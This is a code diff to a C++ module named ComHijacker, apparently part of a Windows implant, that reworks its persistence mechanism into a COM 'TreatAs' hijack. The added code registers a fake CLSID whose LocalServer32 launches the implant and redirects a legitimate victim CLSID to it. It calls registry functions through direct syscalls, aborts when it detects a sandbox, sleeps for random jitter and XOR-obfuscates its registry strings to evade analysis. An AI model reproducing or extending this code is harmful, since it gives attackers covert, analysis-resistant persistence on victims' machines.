@@ -1,16 +1,29 @@
 #include "ComHijacker.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
+#include "../evasion/AntiSandbox.h"
 #include "../utils/Obfuscator.h"
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
 #include <vector>
 #include <sstream>
+#include <thread>
+#include <chrono>
 
 namespace persistence {
 
-bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
-    LOG_DEBUG("ComHijacker::Install started");
+bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& victimClsid) {
+    LOG_DEBUG("ComHijacker::Install (TreatAs mode) started");
+
+    // 1. Anti-Analysis
+    if (evasion::IsLikelySandbox()) {
+        LOG_WARN("Sandbox detected. Aborting persistence.");
+        return false;
+    }
+
+    // 2. Jitter
+    int jitter = (rand() % 5000) + 2000; // 2-7 seconds
+    std::this_thread::sleep_for(std::chrono::milliseconds(jitter));
 
     std::wstring sid = utils::GetCurrentUserSid();
     if (sid.empty()) {
@@ -28,6 +41,10 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         return false;
     }
 
+    // Our fake CLSID that points to implant
+    // {D062E522-8302-4A73-A337-02A7E1337424} - randomly chosen
+    std::wstring ourClsid = L"{D062E522-8302-4A73-A337-02A7E1337424}";
+
     // Open HKCU root (NT path: \Registry\User\<SID>)
     std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
     UNICODE_STRING uHkcu;
@@ -39,7 +56,6 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE hHkcu = NULL;
-    // Note: Use KEY_CREATE_SUB_KEY or KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
     if (!NT_SUCCESS(status)) {
@@ -47,83 +63,125 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         return false;
     }
 
-    std::wstring relativePath = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
-    HANDLE hKey = NULL;
-    status = utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
+    // A. Create our own fake CLSID -> LocalServer32 = implantPath
+    // We use LocalServer32 because we are an EXE.
+    // "Software\\Classes\\CLSID\\"
+    std::wstring clsBase = utils::xor_wstr(L"\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x19\x36\x3b\x29\x29\x3f\x29\x00\x19\x16\x03\x13\x1e\x00", 23);
+    // "LocalServer32"
+    std::wstring locSrv = utils::xor_wstr(L"\x16\x35\x39\x3b\x36\x09\x3f\x28\x2c\x3f\x28\x69\x68", 13);
 
-    // Close HKCU root handle
-    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    std::wstring ourRelativePath = clsBase + ourClsid + L"\\" + locSrv;
+    HANDLE hOurKey = NULL;
+    status = utils::Shared::NtCreateKeyRelative(hHkcu, ourRelativePath, &hOurKey);
 
     if (NT_SUCCESS(status)) {
-        LOG_DEBUG("NtCreateKeyRelative successful");
-
-        // Set default value (implant path)
         UNICODE_STRING uEmpty = {0, 0, NULL};
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
-
-        // Set ThreadingModel
-        std::wstring tm = L"ThreadingModel";
-        UNICODE_STRING uTm;
-        uTm.Buffer = (PWSTR)tm.c_str();
-        uTm.Length = (USHORT)(tm.length() * sizeof(wchar_t));
-        uTm.MaximumLength = uTm.Length + sizeof(wchar_t);
-
-        std::wstring tmVal = L"Both";
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)tmVal.c_str(), (PVOID)(UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
-
-        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-        LOG_INFO("COM registration keys set via direct syscalls.");
-        return true;
+        InternalDoSyscall(ntSetValueKeySsn, hOurKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, hOurKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     } else {
-        LOG_ERR("NtCreateKeyRelative failed: 0x" + utils::Shared::ToHex((unsigned int)status));
+        LOG_ERR("Failed to create fake CLSID key: 0x" + utils::Shared::ToHex((unsigned int)status));
+        InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        return false;
     }
 
-    return false;
+    // B. Hijack legitimate victim CLSID via TreatAs -> points to our fake CLSID
+    // "TreatAs"
+    std::wstring treatAs = utils::xor_wstr(L"\x0e\x28\x3f\x3b\x2e\x1b\x29", 7);
+    std::wstring treatAsRelativePath = clsBase + victimClsid + L"\\" + treatAs;
+    HANDLE hTreatAsKey = NULL;
+    status = utils::Shared::NtCreateKeyRelative(hHkcu, treatAsRelativePath, &hTreatAsKey);
+
+    if (NT_SUCCESS(status)) {
+        UNICODE_STRING uEmpty = {0, 0, NULL};
+        InternalDoSyscall(ntSetValueKeySsn, hTreatAsKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)ourClsid.c_str(), (PVOID)(UINT_PTR)((ourClsid.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, hTreatAsKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        LOG_INFO("TreatAs hijack installed: " + utils::ws2s(victimClsid) + " -> " + utils::ws2s(ourClsid));
+    } else {
+        LOG_ERR("Failed to create TreatAs key: 0x" + utils::Shared::ToHex((unsigned int)status));
+    }
+
+    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    return NT_SUCCESS(status);
 }
 
-bool ComHijacker::Uninstall(const std::wstring& clsid) {
+bool ComHijacker::Uninstall(const std::wstring& victimClsid) {
+    LOG_DEBUG("ComHijacker::Uninstall started");
     std::wstring sid = utils::GetCurrentUserSid();
     if (sid.empty()) return false;
 
-    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\Software\\Classes\\CLSID\\" + clsid;
+    // Fake CLSID needs to be matched
+    std::wstring ourClsid = L"{D062E522-8302-4A73-A337-02A7E1337424}";
 
     auto& resolver = evasion::SyscallResolver::GetInstance();
     DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
     DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
 
-    UNICODE_STRING uPath;
-    uPath.Buffer = (PWSTR)fullPath.c_str();
-    uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
-    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
+    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
+    UNICODE_STRING uHkcu;
+    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
+    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
+    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
 
     OBJECT_ATTRIBUTES objAttr;
-    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-    if (NT_SUCCESS(status)) {
-        // We should delete InprocServer32 first
-        std::wstring subPath = fullPath + L"\\InprocServer32";
-        UNICODE_STRING uSubPath;
-        uSubPath.Buffer = (PWSTR)subPath.c_str();
-        uSubPath.Length = (USHORT)(subPath.length() * sizeof(wchar_t));
-        uSubPath.MaximumLength = uSubPath.Length + sizeof(wchar_t);
+    HANDLE hHkcu = NULL;
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    if (!NT_SUCCESS(status)) return false;
 
-        OBJECT_ATTRIBUTES subAttr;
-        InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    // 1. Delete TreatAs for victim
+    std::wstring clsBase = utils::xor_wstr(L"\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x19\x36\x3b\x29\x29\x3f\x29\x00\x19\x16\x03\x13\x1e\x00", 23);
+    std::wstring treatAs = utils::xor_wstr(L"\x0e\x28\x3f\x3b\x2e\x1b\x29", 7);
 
-        HANDLE hSubKey = NULL;
-        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &subAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
-            InternalDoSyscall(ntDeleteKeySsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-            InternalDoSyscall(ntCloseSsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-        }
+    std::wstring victimPath = clsBase + victimClsid + L"\\" + treatAs;
+    UNICODE_STRING uVictim;
+    uVictim.Buffer = (PWSTR)victimPath.c_str();
+    uVictim.Length = (USHORT)(victimPath.length() * sizeof(wchar_t));
+    uVictim.MaximumLength = uVictim.Length + sizeof(wchar_t);
 
-        status = InternalDoSyscall(ntDeleteKeySsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    OBJECT_ATTRIBUTES victimAttr;
+    InitializeObjectAttributes(&victimAttr, &uVictim, OBJ_CASE_INSENSITIVE, hHkcu, NULL);
+    HANDLE hVictimKey = NULL;
+    if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hVictimKey, (PVOID)(UINT_PTR)DELETE, &victimAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
+        InternalDoSyscall(ntDeleteKeySsn, hVictimKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, hVictimKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     }
 
-    return NT_SUCCESS(status);
+    // 2. Delete our fake CLSID
+    std::wstring ourPath = clsBase + ourClsid;
+    // Note: Recursive delete would be needed if there are subkeys like LocalServer32.
+    // For simplicity, we delete LocalServer32 first.
+    std::wstring locSrv = utils::xor_wstr(L"\x16\x35\x39\x3b\x36\x09\x3f\x28\x2c\x3f\x28\x69\x68", 13);
+    std::wstring ourServerPath = ourPath + L"\\" + locSrv;
+    UNICODE_STRING uOurServer;
+    uOurServer.Buffer = (PWSTR)ourServerPath.c_str();
+    uOurServer.Length = (USHORT)(ourServerPath.length() * sizeof(wchar_t));
+    uOurServer.MaximumLength = uOurServer.Length + sizeof(wchar_t);
+
+    OBJECT_ATTRIBUTES ourServerAttr;
+    InitializeObjectAttributes(&ourServerAttr, &uOurServer, OBJ_CASE_INSENSITIVE, hHkcu, NULL);
+    HANDLE hOurServerKey = NULL;
+    if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hOurServerKey, (PVOID)(UINT_PTR)DELETE, &ourServerAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
+        InternalDoSyscall(ntDeleteKeySsn, hOurServerKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, hOurServerKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    }
+
+    UNICODE_STRING uOur;
+    uOur.Buffer = (PWSTR)ourPath.c_str();
+    uOur.Length = (USHORT)(ourPath.length() * sizeof(wchar_t));
+    uOur.MaximumLength = uOur.Length + sizeof(wchar_t);
+
+    OBJECT_ATTRIBUTES ourAttr;
+    InitializeObjectAttributes(&ourAttr, &uOur, OBJ_CASE_INSENSITIVE, hHkcu, NULL);
+    HANDLE hOurKey = NULL;
+    if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hOurKey, (PVOID)(UINT_PTR)DELETE, &ourAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
+        InternalDoSyscall(ntDeleteKeySsn, hOurKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, hOurKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    }
+
+    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    return true;
 }
 
 } // namespace persistence
